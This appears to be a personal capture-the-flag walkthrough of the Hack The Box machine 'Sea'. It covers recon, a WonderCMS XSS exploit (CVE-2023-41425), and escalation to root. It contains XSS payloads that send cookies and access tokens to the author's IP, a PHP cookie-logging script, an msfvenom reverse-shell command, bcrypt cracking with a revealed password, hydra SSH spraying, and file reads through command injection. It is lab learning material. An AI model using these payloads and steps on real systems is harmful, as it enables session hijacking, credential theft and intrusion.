---
tags:
  - Linux
  - HTB
  - XSS
  - deserialization
  - WonderCMS
creation date: ""
Date Completed: 2024-08-16
CVEs: CVE-2023-41425
URL: 
New Tools:
---
## Information Gathering
### Nmap
`sudo nmap -sT -sV -sC -O -p- -T5 $IP  `

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

### ffuf
```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt:FUZZ -u http://sea.htb/FUZZ 
```

There's a "contact" link on the "How to Participate" page
Click that and you'll find a form

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u $URL -H "HOST: FUZZ.jab.htb"
```

nothing from ffuf...

#### Testing form contact.php
i tried a bunch of shit in burp- injecting crap into every parameter
i even tried fuzzing for parameters
i tried entering my IP as the website URL - got nothing...
finally decided to pop over to 0xBEN and see what his hint was... turns out i was on the right track with using my IP as the web URL........

![[Pasted image 20240816165316.png]]
now to figure out the expoit....
Finally... is a XSS session hijacking thing
time to review the HTB lesson https://enterprise.hackthebox.com/academy-lab/5343/5286/modules/103/1008

## Exploiting the XSS Vulnerability with Session Hijacking

JavaScript payloads to try:
```javascript
document.location='http://10.10.15.64:80/index.php?c='+document.cookie;
new Image().src='http://10.10.15.64:8000/index.php?c='+document.cookie;

<script>document.location='http://10.10.15.64:00/XSS/index.php?c='+document.cookie</script>

<script>document.location='http://10.10.15.64:00/XSS/index.php?c='+localStorage.getItem('access_token')</script>

<script>new Image().src="http://10.10.15.64:80/index.php?c="+document.cookie;</script>

<script>new Image().src="http://10.10.15.64:80/index.php?c="+localStorage.getItem('access_token');</script>
```

working payload script.js
```javascript

```

index.html code:
```html
<script src=http://10.10.15.64:80/script.js></script>
```

index.php script:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

host a php server and move all the files to it (index.php, index.html, script.js)
```session
mkdir /tmp/tmpserver 
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

![[Pasted image 20240816222201.png]]

**NOTHING IS WOKRING!!!!** 😢

## Time to look at Ben's Hints 😥
Basically he says keep looking at the website and it's code 😒
### Nikto

![[Pasted image 20240817083644.png]]

### Checking out the code

literally searching github for various lines from the code
![[Pasted image 20240817083717.png]]

![[Pasted image 20240817083732.png]]

So its running WonderCMS.... which has a few CVEs 💰

https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413#file-cve-2023-41425-md

HOLY FUCKING COW... WTF... LEARN TO READ.. AND DO WHAT IS SAYS... NOT EVERYTHING IS A VARIABLE 😂

I seen this in the exploit ![[Pasted image 20240817210849.png]] and thought it meant I needed to discover the 'loginURL' alas i was wrong. That literally is the login url 🤣

## Foothold
Actual fucking POC that works
https://github.com/insomnia-jacob/CVE-2023-41425
![[Pasted image 20240817220745.png]]
![[Pasted image 20240817220728.png]]


## Get a better 🐚
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.15.64 LPORT=31337 -f ELF > shell

files the other users own
![[Pasted image 20240817222651.png]]

### back to the beginning
lets go back to the beginning, where we landed, and enumerate from there. usually there is something in the vasinity of where you land on a box and i probably overlooked it. also this shells sucks ass so when i try to do finds i'm unable to scroll up and see everything. i tried a meterpreter session but i crashed metasploit... 

cat /var/www/sea/data/database.js
![[Pasted image 20240817222910.png]]

## cash money 💰💵
we got a hashed password!
```
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q
```

bcrypt hashes are literally the devil
 Because they have a "/" in them there is an added "\" when they are stored so they are interpreted correctly. what the actual fuck
```
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```

```
hashcat -m 3200 hash ~/tools/rockyou.txt
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
```

## Lateral Movement
With that password i am now an admin on the site. i did try to password spray ssh but it got me now where. 
`hydra -L user -P pass 10.129.13.71 ssh `

sumbitch... look at that command up there! whats wrong with it?! oh thats rights, thats the wrong IP address motherfucker!!! I just wasted a whole bunch of time trying to get RCE from the website because of this. Eventually, after several failed attemts at a file upload attack I asked myself "what would getting a shell as an admin on the website actually get me" OH THATS RIGHT ABSOTULTY FUCK ALL!! I'M ALREADY ON THE BOX AS WWW-DATA WITH THE SITE RUNS ON THE BOX AS YOU STUPID FUCKING TWAT!!

Anyway... after rerunning hydra with the CORRECT IP address I got a hit

![[Pasted image 20240817230355.png]]

LET'S GOOOOO!!!

![[Pasted image 20240817230532.png]]

## Linpeas
![[Pasted image 20240817232459.png]]

only amay and root have logged into this box
**![[Pasted image 20240817232602.png]]

i have been unable to enumerate the ports listed above so i'm trying proxychains...
`proxychains nmap -sV -p34791,8080 localhost`
![[Pasted image 20240818002212.png]]

![[Pasted image 20240818002635.png]]

`proxychains firefox-esr http://localhost:8080 `
 amay:mychemicalromance
![[Pasted image 20240818003502.png]]

Inspect page > click analyze (any file) > right click POST request > Click Edit and Resend > edit to include the following body:
![[Pasted image 20240818005642.png]]
View Response:
![[Pasted image 20240818005654.png]]
So we're on the right track just need to try harder...

first, we need to figure out what service this is
```
systemctl --type=service --state=running
```

![[Pasted image 20240818005604.png]]

This looks awfully familiar
`monitoring.service          loaded active running System Monitoring Developing`
Note the description matches the title of our webpage

could this be something:
![[Pasted image 20240818010049.png]]

we're getting closer

![[Pasted image 20240818010850.png]]

So using the method above (modifying POST requests) I'm able to see /etc/passwd and etc/shadow but for some reason cannot read the flags (user or root)
can read:
/root/.bashrc

finally figured it out

## Root RCE

![[Pasted image 20240818021214.png]]
![[Pasted image 20240818021232.png]]

By putting the &analyze_log on a new line it allowed log_file to do what it needed and not get cut off by the analyze bullshit.
